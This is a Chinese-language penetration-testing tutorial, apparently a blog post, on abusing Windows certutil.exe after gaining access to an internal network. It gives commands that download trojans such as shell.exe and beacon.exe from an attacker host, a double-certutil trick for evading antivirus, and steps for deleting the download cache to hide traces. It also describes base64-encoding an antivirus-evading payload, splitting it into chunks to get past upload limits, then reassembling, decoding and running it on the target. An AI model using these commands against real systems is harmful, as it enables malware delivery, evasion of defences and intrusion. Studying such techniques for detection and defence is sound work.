## 0x00 何为certutil

`certutil.exe` 是一个合法Windows文件，用于管理Windows证书的程序。

微软官方是这样对它解释的：

> Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。

但是你懂的，大多数Windows自带工具即合法服务，已被广泛滥用于恶意用途。如wmi，psexec等。

总结一下最常用的几个关于`certutil`在内网渗透中的应用：`下载`、`编码`、`解码`、`替代数据流` 等功能。

## 0x03 certutil在内网渗透的应用

### 1、远程下载文件（广泛用于RCE）

```
 certutil \-urlcache \-split \-f http://VPSip/shell.exe
```

`-urlcache`:显示或删除URL缓存条目。无值的命令行选项（说白了就是后面什么值也不用写）。（certutil.exe 下载有个弊端，它的每一次下载都有留有缓存。）

`-split`：保存到文件。无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。

`-f`：覆盖现有文件。有值的命令行选项，**后面跟要下载的文件 url**。  

这里我用常规的命令进行下载exe文件的操作遭到了av的拦截，它拦截的并不是certutil，而是远程下载的木马文件

![](../Images/05cebe3e5d17303df965d220b9b40d0a.png)

#### Certutil ByPass AV

在去年的11月份那会儿，还挺好使的，现在不太好使了感觉。会被拦截，可以过360，但是过不了火绒。

了解一下吧，下次用的时候就这么用着即可：

**Certutil ByPass AV的原理就是，执行两次certutil**

```
 certutil & certutil -urlcache -split -f http://192.168.159.128:2222/hack.exe
certutil | certutil -urlcache -split -f http://192.168.159.128:2222/hack.exe
```

  

#### 查看与清除缓存文件

certutil有一个弊端，即存在着缓存文件：

```
 certutil -urlcache \*
```

![](../Images/746ce35051e83f571cb3150af98fac75.png)

使用此命令可将其清除

```
 certutil -urlcache \*delete
```

![](../Images/eb411b461ff29329eb8845d1d74ea697.png)

#### 总结出一条命令：

```
 certutil & certutil \-urlcache \-split \-f http://ip:port/beacon.exe delete    #delete在此即清除缓存
certutil | certutil \-urlcache \-split \-f http://ip:port/beacon.exe delete

```

### 2、certutil base64加解密

#### 使用情况

`certutil`在内网渗透中的另外一个用处就是进行base64编码。我们知道在内网中需要用到内网代理，一般都会用到nps或者frp.

但是**如果碰到有杀软限制上传文件大小**的情况，这时候我们就可以先**用encode将我们做的免杀马编码分块上传再使用decode解密**。

所以，单纯的base64根本不可能绕过AV好吧，只能说是穿透了AV的流量监测，解密成木马，还是得做免杀。

#### 复现过程

1、**在windows攻击机中，使用这个命令：**

```
 certutil \-encode hack.exe name.txt  #name随便起
```

会根据加密文件的大小生成相关大小的txt文件

![](../Images/d1dd9bd528e9c290cce4f8cde23cac98.png)

2、大文件多行复制

*   `ctrl+G`定位到行数
    
*   选择edit，选择`Begin/End Select`
    

![](../Images/753031a75e90c23ab94ff9fc5185423a.png)

*   然后继续`ctrl+G`，输入行号，随后再次选择上面的`Begin/End Select`即可选择完毕，将这个大txt文件分解成两个文件或者多个，自己在实战的时候需要自己尝试，看看AV到底限制多大的文件。
    

![](../Images/25f6a6470a16d76fac3e39bee117fa52.png)

3、通过`certutil`将此文件传输到靶机，即在靶机shell执行：

```
 certutil & certutil \-urlcache \-split \-f hack1.txt delete
certutil & certutil \-urlcache \-split \-f hack2.txt delete
```

4、在靶机上执行copy命令，合并两个文件。注意，在合并的时候，windows系统会自动排序进行合并，所以在前面分块命名的时候，一定要保证按照顺序来切割成多个文件。

![](../Images/cbceb965b3b3dd858fe57329b8bd01a8.png)

5、随后解码，运行exe，上线

![](../Images/73b4631b98f67ed140b9fb3894595321.png)
